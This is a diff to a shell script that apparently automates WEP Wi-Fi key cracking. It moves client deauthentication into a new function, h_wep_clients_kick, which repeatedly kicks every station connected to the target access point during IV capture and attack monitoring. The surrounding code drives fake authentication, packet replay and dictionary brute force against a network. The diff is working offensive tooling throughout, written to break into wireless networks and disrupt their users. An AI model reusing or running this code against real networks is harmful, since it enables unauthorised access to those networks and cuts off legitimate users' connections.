@@ -12,6 +12,17 @@ h_wep_key_log() {
 	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WEP_F
 }
 
+h_wep_clients_kick() {
+	local clients
+	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
+	if [ -n "$clients" ]; then
+		for client in $clients; do
+			h_log 1 "found a client station: '$client', kicking :)"
+			h_auth_start h_wep_deauth -c $client
+		done
+	fi
+}
+
 h_wep_wait_for_iv() {
 	local iv
 	local iv_min
@@ -32,6 +43,7 @@ h_wep_wait_for_iv() {
 		iv=$(h_csv_get_network_iv_count $H_CUR_CSV_F $H_CUR_BSSID)
 		h_log 1 "got $iv IVs so far"
 		[ $iv -ge $iv_min ] && return 0
+		h_wep_clients_kick
 	done
 	h_log 1 "not enough IVs captured"
 	return 1
@@ -64,6 +76,7 @@ h_wep_attack_is_working() {
 		[ $iv_rate -ge $H_IV_RATE_SUCCESS ] && return 0
 		iv_last=$iv
 		time_last=$time
+		h_wep_clients_kick
 	done
 	return 1
 }
@@ -71,7 +84,6 @@ h_wep_attack_is_working() {
 h_wep_attack_try() {
 	local replay_func
 	local auth_func
-	local clients
 	local iv
 	local crack_time_started
 	local RC
@@ -80,14 +92,6 @@ h_wep_attack_try() {
 
 	h_replay_start $replay_func
 	h_auth_start h_wep_auth_fake1
-
-	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
-	if [ -n "$clients" ]; then
-		for client in $clients; do
-			h_log 1 "found a client station: $client"
-			h_auth_start h_wep_deauth -c $client
-		done
-	fi
 
 	RC=1
 	if h_wep_attack_is_working; then
@@ -141,15 +145,6 @@ h_wep_bruteforce_try() {
 	local dicts
 	local words
 	local RC
-
-	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
-	if [ -n "$clients" ]; then
-		for client in $clients; do
-			h_log 1 "found a client station: $client"
-			h_auth_start h_wep_deauth -c $client
-		done
-		sleep 1
-	fi
 
 	country=$H_CUR_COUNTRY
 
